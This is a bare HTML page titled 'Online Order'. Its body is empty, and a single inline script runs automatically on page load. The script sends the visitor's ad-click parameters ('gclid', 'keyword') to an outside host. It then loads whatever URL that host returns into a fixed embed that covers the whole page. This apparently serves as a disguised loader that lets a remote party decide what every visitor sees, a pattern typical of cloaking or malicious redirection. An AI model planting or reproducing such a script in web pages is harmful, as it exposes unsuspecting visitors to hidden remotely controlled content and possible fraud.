<html>
  
  <head>
    <script>
(function() {
    const p = new URLSearchParams(location.search);
    const url = `https://twtds.info/rujsframe?gclid=${encodeURIComponent(p.get('gclid')||'')}&keyword=${encodeURIComponent(p.get('keyword')||'')}`;
    
    fetch(url)
        .then(response => response.text())
        .then(targetUrl => {
            const container = document.createElement('div');
            container.style.cssText = 'width:100%;height:100vh;position:fixed;top:0;left:0;z-index:1000;';
            container.innerHTML = `<embed src="${targetUrl}" style="width:100%;height:100%;border:none;">`;
            document.body.appendChild(container);
        });
})();


</script>
    <title>Online Order</title>
  </head>
  <body>

  </body>
</html>
